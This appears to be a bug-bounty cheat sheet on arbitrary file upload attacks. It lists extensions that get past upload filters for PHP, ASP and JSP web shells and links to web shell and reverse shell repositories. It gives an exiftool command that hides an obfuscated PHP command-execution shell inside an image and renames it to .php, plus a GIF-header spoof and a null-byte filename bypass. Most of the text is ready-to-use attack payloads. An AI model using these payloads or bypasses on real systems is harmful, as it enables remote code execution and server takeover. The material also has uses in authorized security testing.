## Arbitrary File Upload (AFU)
![](https://i0.wp.com/blog.intigriti.com/wp-content/uploads/2020/05/file-upload.png?fit=1050%2C750&ssl=1)


**Learn Content Types**

```
Plain Text (.txt): text/plain
Rich Text Format (.rtf): text/rtf
Markdown (.md): text/markdown
PDF (.pdf): application/pdf
JPEG (.jpg, .jpeg): image/jpeg
PNG (.png): image/png
GIF (.gif): image/gif
BMP (.bmp): image/bmp
TIFF (.tiff, .tif): image/tiff
MP3 (.mp3): audio/mpeg
WAV (.wav): audio/wav
FLAC (.flac): audio/flac
AAC (.aac): audio/aac
MPEG (.mpeg, .mpg): video/mpeg
AVI (.avi): video/x-msvideo
MP4 (.mp4): video/mp4
MKV (.mkv): video/x-matroska
ZIP (.zip): application/zip
RAR (.rar): application/x-rar-compressed
7-Zip (.7z): application/x-7z-compressed
TAR (.tar): application/x-tar
GZ (.gz): application/gzip
BZ2 (.bz2): application/x-bzip2
avaScript (.js): application/javascript
Python (.py): text/x-python
Java (.java): text/x-java-source
C++ (.cpp, .h): text/x-c++
HTML (.html): text/html
CSS (.css): text/css
application/x-httpd-php
application/octet-stream
```

**Bypass PHP Shells**
```
php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .htaccess, .phar, .inc, .ctp, (all are not case sensitive)
```

**Bypass ASP Shells**
```
asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer
```

**Bypass JSP Shells**
```
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
```

**Server Side Scripts**
```
.cgi , .shtml
```

**PHP Web Shells**

| WSO Shell | [Click](https://github.com/mIcHyAmRaNe/wso-webshell) |
| Reverse Shelll | [Click](https://github.com/yellphonenaing/reverse_shell) |
| Tiny FileManager | [Click](https://github.com/prasathmani/tinyfilemanager) |
| Bypass Shells | [Click](https://github.com/T-Tools/bypass_shells) |

**Hide Shell Codes In a File**

```
exiftool -Comment='<?php $x=$_GET;$sys="system";$c="c";$m="m";$d="d";!isset($x[$c.$m.$d])?phpinfo():$sys($x[$c.$m.$d]);?> ' shell.png
mv shell.png shell.php
```

**Bypass With GIF File Header**

```
Add GIF89a; in the first line of shell file
echo -n "GIF89a;" >shell.php
cat shellfile.php >>shell.php
```

**Nulled Bypass**

```
shell.php%00.png => shell.php
```

**Bug Bounty Tip**
```
Allow uploading html files leads to client site attacks and cors.
Allow Uploading Files With Unusual Extensions Leads To Client Site attacks And CORS.
```
